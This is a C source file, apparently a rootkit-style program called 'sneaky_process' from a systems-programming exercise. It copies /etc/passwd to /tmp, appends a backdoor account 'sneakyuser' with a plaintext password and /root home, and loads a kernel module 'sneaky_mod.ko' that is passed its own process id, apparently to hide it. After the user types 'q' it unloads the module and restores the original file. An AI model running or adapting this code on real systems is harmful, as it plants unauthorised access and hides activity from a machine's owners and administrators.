#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>

void loopTilKill(void) {
  char chr = 'a';
  do {
    int num = getc(stdin);
    chr = (char) num;
  } while(chr != 'q');
  return;
}

void copyFile(FILE * source, FILE * dest) {
  int c = 0;
  while((c = fgetc(source)) != EOF) {
    fputc(c, dest);
  }
}

int main(int argc, char * argv[]) {
  printf("sneaky_process pid=%d\n", getpid());
  FILE * source = fopen("/etc/passwd", "a+");
  FILE * dest = fopen("/tmp/passwd", "w");
  if(source == NULL || dest == NULL) {
    printf("File was not opened\n");
    return EXIT_FAILURE;
  }
  copyFile(source, dest);
  if(fputs("sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n", source) < 0) {
    printf("fputs failed\n");
    return EXIT_FAILURE;
  }
  fclose(source);
  fclose(dest);
  pid_t cpid = fork();
  if(cpid == -1) {
    printf("Failed to fork\n");
    return EXIT_FAILURE;
  }
  if(cpid == 0) {
    char pid[10] = "";
    snprintf(pid, sizeof(pid), "%d",(int)getppid());
    char equals[15] = "pid=";
    char * const pid_arg = strcat(equals,pid);
    char * const newargv[] = {"insmod", "sneaky_mod.ko", pid_arg, NULL};
    execvp("insmod", newargv);
    printf("Execve failed\n");
    return EXIT_FAILURE;
  }
  else {
    int status;
    waitpid(cpid, &status, 0);
  }
  loopTilKill();
  pid_t cpid2 = fork();
  if(cpid2 == -1) {
    printf("Failed to fork\n");
    return EXIT_FAILURE;
  }
  if(cpid2 == 0) {
    char * argv[] = {"rmmod", "sneaky_mod", NULL};
    execvp("rmmod", argv);
    printf("Execve failed\n");
    return EXIT_FAILURE;
  }
  else {
    int status;
    waitpid(cpid2, &status, 0);
  }
  dest = fopen("/etc/passwd", "w");
  source = fopen("/tmp/passwd", "r");
  copyFile(source, dest);
  fclose(source);
  fclose(dest);
  int r = remove("/tmp/passwd");
  if(r != 0) {
    printf("Couldn't remove /tmp/passwd\n");
    return EXIT_FAILURE;
  }
  return EXIT_SUCCESS;
}
